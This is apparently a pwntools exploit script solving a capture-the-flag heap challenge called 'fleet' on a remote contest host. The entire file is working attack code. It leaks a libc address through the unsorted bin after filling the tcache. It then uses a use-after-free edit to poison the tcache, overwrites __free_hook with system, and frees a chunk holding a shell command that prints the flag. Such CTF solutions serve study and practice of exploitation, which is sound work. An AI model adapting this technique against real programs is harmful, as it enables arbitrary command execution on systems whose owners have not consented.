from pwn import *

HOST = "2vl7azdr4vhf.boroctf.com"
PORT = 28267

context.binary = elf = ELF("./fleet")
libc = ELF("./sinbad.so.6")
context.log_level = "info"


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./fleet"])


def cmd(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())


def alloc(io, idx):
    cmd(io, 1)
    io.sendlineafter(b"Ship index: ", str(idx).encode())


def free(io, idx):
    cmd(io, 2)
    io.sendlineafter(b"Ship index: ", str(idx).encode())


def show(io, idx):
    cmd(io, 3)
    io.sendlineafter(b"Ship index: ", str(idx).encode())
    io.recvuntil(b"Inspection Results: ")
    return io.recvuntil(b"\n\n", drop=True)


def edit(io, idx, data):
    cmd(io, 4)
    io.sendlineafter(b"Ship index: ", str(idx).encode())
    io.sendafter(b"What we need to do Cap?\n", data.ljust(136, b"\x00"))


io = start()

for i in range(9):
    alloc(io, i)

for i in range(7):
    free(io, i)

free(io, 7)
leak = u64(show(io, 7).ljust(8, b"\x00"))
libc.address = leak - 0x1ECBE0
log.info(f"libc leak   = {hex(leak)}")
log.info(f"libc base   = {hex(libc.address)}")
log.info(f"__free_hook = {hex(libc.sym['__free_hook'])}")
log.info(f"system      = {hex(libc.sym['system'])}")

edit(io, 6, p64(libc.sym["__free_hook"]))
alloc(io, 0)
edit(io, 0, b"cat flag* 2>/dev/null || cat /flag 2>/dev/null")
alloc(io, 1)
edit(io, 1, p64(libc.sym["system"]))

free(io, 0)
print(io.recvrepeat(1).decode("latin-1", errors="ignore"))
